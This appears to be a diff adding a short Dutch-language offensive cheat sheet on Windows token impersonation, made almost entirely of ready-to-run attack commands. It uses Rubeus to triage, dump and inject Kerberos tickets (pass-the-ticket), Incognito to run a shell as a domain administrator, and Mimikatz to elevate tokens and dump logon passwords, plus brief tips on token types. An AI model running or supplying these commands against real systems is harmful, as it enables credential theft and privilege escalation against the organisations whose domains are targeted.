@@ -1,0 +1,17 @@
+# Token Impersonation - Gestolen tokens hergebruiken
+# Methode 1: Rubeus - triage beschikbare tickets
+.\Rubeus.exe triage
+# Ticket extraheren en injecteren:
+.\Rubeus.exe dump /luid:0x12345 /nowrap
+.\Rubeus.exe ptt /ticket:BASE64_TICKET_HERE
+# Methode 2: Incognito - token lijst en impersonate
+.\incognito.exe list_tokens -u
+.\incognito.exe execute -c "DOMAIN\Administrator" cmd.exe
+# Methode 3: Mimikatz token elevation
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
+# Specifieke user impersonaten:
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate /domainadmin" "token::run /process:cmd.exe"'
+# Methode 4: PowerShell (als al elevated)
+[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+# Tip: Delegation tokens = interactieve logons (RDP, runas)
+# Tip: Impersonation tokens = netwerk logons (drive mappings)
